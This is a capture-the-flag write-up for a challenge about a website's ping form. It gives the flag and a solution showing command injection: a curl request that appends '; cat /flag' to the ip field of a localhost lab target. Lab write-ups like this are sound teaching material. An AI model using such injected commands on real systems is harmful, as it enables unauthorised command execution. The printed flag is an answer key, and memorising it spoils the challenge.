# Ping of Death

**Description:** Some kid joined my Minecraft server and threatened that they were going to DDoS me using this dodgy website. In the end they just pinged my server, but I am 99% certain you can do a lot more with that website. Can you hack the dodgy website and read the flag at `/flag` on the server?

You should be able to figure out a way to run the command `cat /flag`!

**Flag:** CTF{sCr1pTI3_k1Dd1e5_c4nN0t_pR0gRaM_aNyThIng!!11one!}

## Solution

* The target input is vulnerable to command injection.

* Additional terminal commands can be appended using either `&&`, `||` or `;` as an example.

* Example curl command to print the flag

```bash
curl -XPOST -d 'ip=8.8.8.8; cat /flag' 'http://localhost:1337/pingtodeath.php'
```
